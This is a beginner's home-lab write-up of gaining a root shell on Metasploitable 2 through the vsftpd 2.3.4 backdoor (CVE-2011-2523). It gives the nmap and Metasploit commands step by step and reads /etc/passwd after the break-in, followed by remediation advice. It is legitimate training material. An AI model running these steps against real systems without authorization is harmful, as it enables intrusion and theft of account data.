# Exploiting vsftpd 2.3.4 Backdoor on Metasploitable 2

## Overview
This write-up documents my first successful penetration testing exercise: exploiting a backdoor vulnerability in vsftpd 2.3.4 running on Metasploitable 2 to gain root access to the target system.

## Objective
Identify and exploit a vulnerable FTP service to gain unauthorized access to the Metasploitable 2 system.

## Tools Used
- **Kali Linux** - Attack platform
- **Nmap** - Network reconnaissance and port scanning
- **Metasploit Framework** - Exploitation tool
- **Metasploitable 2** - Intentionally vulnerable target system

## Target Information
- **IP Address:** 192.168.122.151
- **Operating System:** Ubuntu 8.04 (Linux metasploitable 2.6.24-16-server)
- **Vulnerable Service:** vsftpd 2.3.4 on port 21

## Exploitation Process

### Step 1: Reconnaissance

Performed an nmap scan with service version detection to identify open ports and running services:

```bash
nmap -sV 192.168.122.151
```

**Key Findings:**
- Port 21/tcp open - FTP service running vsftpd 2.3.4
- Port 22/tcp open - SSH (OpenSSH 4.7p1)
- Port 80/tcp open - HTTP (Apache httpd 2.2.8)
- Multiple other services identified (Samba, MySQL, PostgreSQL, etc.)

The scan revealed vsftpd version 2.3.4, which is known to contain a backdoor vulnerability.

### Step 2: Vulnerability Research

**Vulnerability:** vsftpd 2.3.4 Backdoor Command Execution (CVE-2011-2523)

**Description:** A malicious backdoor was added to the vsftpd download archive between June 30th and July 1st, 2011. This backdoor allows attackers to execute arbitrary commands with root privileges by sending a specially crafted username containing ":)" (smiley face) characters.

**Severity:** Critical
**CVSS Score:** 10.0

### Step 3: Exploitation with Metasploit

Launched the Metasploit Framework:
```bash
msfconsole
```

Searched for available vsftpd exploits:
```bash
search vsftpd
```

**Result:** Found exploit module `exploit/unix/ftp/vsftpd_234_backdoor` with "excellent" reliability ranking.

Selected the exploit:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Configured the target IP address:
```bash
set RHOSTS 192.168.122.151
```

Verified configuration:
```bash
show options
```

Executed the exploit:
```bash
exploit
```

### Step 4: Post-Exploitation

**Exploitation Result:** SUCCESS

The exploit successfully triggered the backdoor and opened a command shell with root privileges.

**Evidence of compromise:**
```bash
whoami
root

pwd
/
```

**Access Level Achieved:** 
- User ID: uid=0(root) gid=0(root)
- Full root/superuser access
- Complete system control

**System Enumeration:**

Listed root directory contents:
```bash
ls -la
```

Accessed sensitive system files:
```bash
cat /etc/passwd
```

Successfully viewed all user accounts on the system, including:
- root
- msfadmin (default Metasploitable user)
- System service accounts (mysql, postgres, www-data, etc.)

## Impact Assessment

This exploitation demonstrates a critical security vulnerability that allows:
- Unauthenticated remote code execution
- Immediate root-level access
- Complete system compromise
- No authentication required
- No user interaction needed

In a real-world scenario, an attacker with this level of access could:
- Steal sensitive data
- Install persistent backdoors
- Use the system as a pivot point to attack other network resources
- Completely destroy or encrypt data (ransomware)
- Monitor all system activity

## Remediation

**Immediate Actions:**
1. Update vsftpd to version 2.3.5 or later
2. Verify package integrity using checksums before installation
3. Implement network segmentation to limit FTP server exposure
4. Use intrusion detection systems (IDS) to monitor for exploitation attempts

**Long-term Security Measures:**
1. Regular security audits and vulnerability scanning
2. Implement least-privilege principles (don't run FTP as root)
3. Consider using SFTP instead of FTP for encrypted file transfers
4. Enable logging and monitor for suspicious authentication attempts
5. Keep all systems patched and up-to-date

## Key Takeaways

**What I Learned:**
1. **Reconnaissance is crucial** - Identifying service versions helps find known vulnerabilities
2. **Metasploit simplifies exploitation** - The framework automates complex exploit delivery
3. **Old software = security risk** - vsftpd 2.3.4 is from 2011; outdated software is dangerous
4. **Root access = game over** - Once an attacker has root, the system is fully compromised
5. **Security is only as strong as the weakest link** - One vulnerable service can compromise an entire system

**Practical Skills Gained:**
- Network reconnaissance with Nmap
- Service version detection
- Using Metasploit Framework
- Exploit module selection and configuration
- Basic post-exploitation enumeration
- Understanding privilege levels in Linux

## References

- [Metasploit Unleashed - vsftpd Backdoor](https://www.offensive-security.com/metasploit-unleashed/scanner-auxiliary-modules/)
- [CVE-2011-2523 Details](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Rapid7 Metasploit Module Documentation](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)

## Disclaimer

This exploitation was performed in a controlled lab environment using intentionally vulnerable systems for educational purposes. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security testing.

---

**Date:** November 17, 2025  
**Environment:** Home Lab (Kali Linux + Metasploitable 2)  
**Status:** Successfully completed first penetration testing exercise
